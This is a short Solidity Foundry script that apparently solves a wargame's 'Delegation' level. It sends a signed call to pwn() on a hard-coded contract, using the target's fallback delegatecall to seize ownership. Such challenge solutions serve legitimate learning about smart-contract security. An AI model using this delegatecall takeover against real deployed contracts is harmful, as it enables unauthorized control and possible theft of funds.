// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level6.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance =
        Delegation(0x8c74E1FC0dA11765d0aD5FACE177CE95cbf30FFf);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }
}
